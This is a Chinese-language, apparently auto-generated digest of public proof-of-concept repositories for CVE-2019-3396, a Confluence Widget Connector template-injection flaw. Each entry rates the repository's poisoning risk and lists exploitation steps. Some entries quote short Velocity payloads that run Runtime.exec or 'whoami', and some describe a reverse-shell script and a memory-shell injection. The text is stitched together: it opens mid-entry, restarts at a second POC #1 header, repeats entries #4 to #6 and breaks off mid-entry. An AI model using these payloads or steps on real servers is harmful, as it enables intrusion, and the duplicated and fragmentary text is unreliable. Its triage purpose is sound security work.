根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

